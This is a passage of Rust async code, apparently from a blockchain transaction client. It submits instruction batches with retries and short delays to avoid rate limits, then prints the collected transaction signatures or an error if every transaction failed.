                instruction_batches.len(),
                MAX_RETRIES
            ));
            println!("Continuing with remaining transactions after a short delay...");
            tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
        }

        // Add delay between transactions to avoid rate limits
        if i < instruction_batches.len() - 1 {
            tokio::time::sleep(tokio::time::Duration::from_millis(300)).await;
        }
    }

    if all_signatures.is_empty() {
        println!("All transactions failed!");
        return Err("All transactions failed".into());
    } else {
        println!(
            "Successfully processed {} of {} transactions!",
            all_signatures.len(),
            instruction_batches.len()
        );
        println!(
            "Transaction signatures: {}",
            all_signatures
                .iter()
                .map(|sig| sig.to_string())
                .collect::<Vec<String>>()
                .join(", ")
        );
    }

    Ok(())
}
